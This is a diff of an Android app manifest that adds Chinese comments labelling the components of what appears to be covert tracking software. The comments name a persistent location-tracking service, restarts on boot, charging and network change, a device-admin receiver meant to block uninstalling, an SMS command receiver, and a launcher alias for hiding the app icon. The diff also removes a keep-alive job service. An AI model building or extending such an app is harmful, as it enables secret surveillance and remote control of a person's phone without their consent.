@@ -31,6 +31,7 @@
         android:usesCleartextTraffic="true"
         android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar">
 
+        <!-- 核心追踪服务 -->
         <service
             android:name=".TrackingService"
             android:enabled="true"
@@ -38,12 +39,7 @@
             android:stopWithTask="false"
             android:foregroundServiceType="location" />
 
-        <!-- 底层拉活任务 -->
-        <service
-            android:name=".KeepAliveJobService"
-            android:permission="android.permission.BIND_JOB_SERVICE"
-            android:exported="true" />
-
+        <!-- 开机自启 -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -55,6 +51,7 @@
             </intent-filter>
         </receiver>
 
+        <!-- 充电恢复 -->
         <receiver
             android:name=".PowerConnectedReceiver"
             android:enabled="true"
@@ -65,6 +62,7 @@
             </intent-filter>
         </receiver>
 
+        <!-- 低版本网络恢复 -->
         <receiver
             android:name=".LegacyNetworkReceiver"
             android:enabled="true"
@@ -74,6 +72,7 @@
             </intent-filter>
         </receiver>
 
+        <!-- 设备管理器（防卸载） -->
         <receiver
             android:name=".MyDeviceAdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
@@ -86,6 +85,7 @@
             </intent-filter>
         </receiver>
 
+        <!-- 短信指令接收 -->
         <receiver
             android:name=".SmsReceiver"
             android:enabled="true"
@@ -102,6 +102,7 @@
             android:windowSoftInputMode="adjustResize"
             android:excludeFromRecents="true" />
 
+        <!-- 权限引导主界面 -->
         <activity
             android:name=".MainActivity"
             android:exported="true">
@@ -111,6 +112,7 @@
             </intent-filter>
         </activity>
 
+        <!-- 桌面启动别名（用于隐藏图标） -->
         <activity-alias
             android:name=".VisibleAliasActivity"
             android:enabled="true"
